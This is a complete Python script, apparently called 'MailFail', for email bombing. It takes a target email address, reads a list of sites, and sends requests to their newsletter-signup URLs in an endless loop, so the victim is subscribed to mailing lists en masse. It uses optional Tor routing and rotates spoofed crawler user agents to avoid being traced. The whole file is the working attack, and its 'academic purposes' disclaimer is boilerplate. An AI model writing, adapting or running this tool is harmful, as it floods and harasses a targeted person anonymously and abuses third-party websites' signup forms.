#!/usr/bin/env python3
import sys
import string
import random
import argparse
import datetime
import json
import colorama
from colorama import Fore, Style

colorama.init(Style.BRIGHT)

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="target email", type=str)
parser.add_argument("-o", "--timeout", help="timeout for requests", type=str)
parser.add_argument("-l", "--list", help="list path", type=str)
parser.add_argument("-T", "--tor", dest="tor", action="store_true", help="enable TOR routing")
parser.set_defaults(tor=False)

args = parser.parse_args()

logo = """\
  __  __       _ _ _____     _ _ 
 |  \/  | __ _(_) |  ___|_ _(_) |
 | |\/| |/ _` | | | |_ / _` | | |
 | |  | | (_| | | |  _| (_| | | |
 |_|  |_|\__,_|_|_|_|  \__,_|_|_|
  v1.0                 by m0rtem
"""

disclamer = """\
This tool is only for academic purposes and testing under controlled 
environments. Do not use without obtaining proper authorization from 
the network owner of the network under testing. The author bears no
responsibility for any misuse of the tool.
"""

if args.list is not None:
	lines = open(args.list).readlines()
else:
	lines = open('list.txt').readlines()

if args.timeout is not None:
	timeout = args.timeout
else:
	timeout = 10
	
useragents = [
	"Mozilla/4.0 (compatible; Cerberian Drtrs Version-3.2-Build-0)",
	"Mozilla/4.0 (compatible; AvantGo 6.0; FreeBSD)",
	"Gigabot/2.0; http://www.gigablast.com/spider.html",
	"Mozilla/5.0 (X11; U; Linux i686; tr-TR; rv:1.9.2.12) Gecko/20101028 Pardus/2009 Firefox/3.6.12",
	"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0 FirePHP/0.7.4",
	"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
	"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
	"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
	"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
	"IRLbot/2.0 (compatible; MSIE 6.0; http://irl.cs.tamu.edu/crawler)",
	"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",
	"TheSuBot/0.2 (www.thesubot.de)",
	"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
	"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
	"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
	"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable",
	"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable"
]

# Import Tor sockets module
import socks
import socket

# Tor wrapper for SOCKS5
if args.tor is True:
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
	socket.socket = socks.socksocket

# Import urllib after socks setup
import urllib.request
import urllib.parse

def print_out(data):
    datetimestr = str(datetime.datetime.strftime(datetime.datetime.now(), '%H:%M:%S'))
    print(Style.NORMAL + "[" + datetimestr + "] " + data + Style.RESET_ALL)

def tor_test():
	# Get Tor IP from wtfismyip
	with urllib.request.urlopen('https://wtfismyip.com/text') as response:
		html = response.read()
		print_out(Style.BRIGHT + Fore.GREEN + "Your Tor IP is: " + html.decode('utf-8'))

def load_url(url, timeout):
	# Build URL query to email signup page
	urlquery = "http://" + url + "/m-users-a-email_list-job-add-email-" + targetEmail + "-source-2.htm"
	print_out(Style.BRIGHT + Fore.WHITE + "Sending request to: " + url)
	# Build the request
	req = urllib.request.Request(
		urlquery, 
		data=None, 
		headers={
			'User-Agent': random.choice(useragents),
			'Host': url
		}
	)
	# Send
	try:
		f = urllib.request.urlopen(req)
		print_out(Style.BRIGHT + Fore.GREEN + "Successfully sent!")
		f.close()
	except urllib.error.URLError as e:
		print_out(Style.BRIGHT + Fore.RED + e.reason)
	

def main(lines):
	while True:
		for line in lines:
			line = line.strip('\n')
			line = line.strip('\t')
			load_url(line, timeout)
	
if __name__ == "__main__":

	print(Fore.RED + Style.BRIGHT + logo + Fore.RESET)
	print(Fore.WHITE + Style.BRIGHT + disclamer + Fore.RESET)

	if args.target is not None:
		targetEmail = args.target
		print_out(Style.BRIGHT + Fore.GREEN + "Target email: " + targetEmail)
	else:
		print_out(Style.BRIGHT + Fore.RED + "Please supply target email...")
		parser.print_help()
		exit(1)

	tor_test()
	
	try:
		while True:
			main(lines)
	except KeyboardInterrupt:
		print_out(Style.BRIGHT + Fore.RED + "Shutting down...")
		exit(1)
